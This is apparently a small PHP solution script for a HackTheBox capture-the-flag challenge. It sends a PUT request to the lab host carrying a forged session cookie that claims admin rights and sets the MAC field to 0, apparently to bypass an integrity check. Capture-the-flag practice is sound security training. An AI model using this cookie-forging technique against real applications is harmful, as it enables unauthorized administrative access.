<?php

$url = "http://docker.hackthebox.eu:42245/index.php";
$cookie = "eyJVc2VyIjoid2hvY2FyZXMiLCJBZG1pbiI6IlRydWUiLCJNQUMiOjB9";

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL,$url);
        curl_setopt($ch, CURLOPT_PUT, 1);
        #curl_setopt($ch, CURLOPT_OPTIONS, 1);
        #curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_COOKIE, "ses=$cookie");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
#       curl_setopt($ch, CURLOPT_POSTFIELDS,
#            "name=fuckhtml&placeholder=Admin&MAC=ff");

        $server_output = curl_exec($ch);
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close ($ch);

var_dump($server_output);
?>
